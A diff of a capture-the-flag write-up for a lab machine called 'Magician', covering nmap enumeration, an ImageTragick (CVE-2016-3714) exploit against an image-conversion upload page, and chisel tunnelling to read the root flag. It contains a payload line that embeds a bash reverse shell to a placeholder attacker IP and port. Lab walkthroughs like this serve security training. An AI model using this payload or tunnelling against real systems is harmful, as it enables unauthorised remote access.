@@ -1,9 +1,9 @@
-##Magician
+## Magician
 
 tag CVE-2016-3714
 add magician to /etc/hosts
 
-#Enumeration
+# Enumeration
 ```
 # Nmap 7.91 scan initiated Sun Feb 21 19:53:49 2021 as: nmap -sC -sV -oN nmap/initial -vvv -p 21,8080,8081 10.10.171.198
 Nmap scan report for magician (10.10.171.198)
@@ -95,13 +95,13 @@ Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Sun Feb 21 19:54:28 2021 -- 1 IP address (1 host up) scanned in 38.50 seconds
 ```
-#FTP
+# FTP
 allows anonymous login after a delay but simply instructs to imagetragik.com to discuss the cve vulnerability
 
-#8080
+# Port 8080
 Enumeration here finds a /file directory which provides a json listing of files uploaded from port 8081
 
-#8081
+# Port 8081
 This allows us to upload pngs to be converted into jpgs
 We need to adjust our imagetragik payload to be able to provide us a reverse shell through this exploitable conversion using imagemagick
 fill 'url(https://IP/logo.dbb7e574.png";bash -c \'bash -i >& /dev/tcp/IP/PORT 0>&1\'")'
@@ -128,19 +128,15 @@ tcp   LISTEN  0       128                   0.0.0.0:8081          0.0.0.0:*
 tcp   LISTEN  0       32                          *:21                  *:*
 tcp   LISTEN  0       100                         *:8080                *:*      users:(("java",pid=1004,fd=25))
 ```
-so lets forward this port us remotely through an ssh tunnel. We can forward this post to ourselves through the following
-
-ssh -R 6666:localhost:6666[user]@[local ip]
-
-#Chisel method
-wget the chisel binary from our machine
+so lets forward this port us remotely through an ssh tunnel. We can forward this post to ourselves through a ssh tunnel or using chisel as follows.
 
 on target 
 ```
 ./chisel client [our ip]:[our port] R:[open local port]:127.0.0.1:6666
 ```
 on our machine
+```
 chisel server --reverse --port [our port]
-
+```
 
 we can then set up an http proxy on port 6666 for localhost and we are presented a new page when we go to magician:8080 seems like we can read files from the system but with root privilege so we simply choose the file /root/root.txt and we have our flag
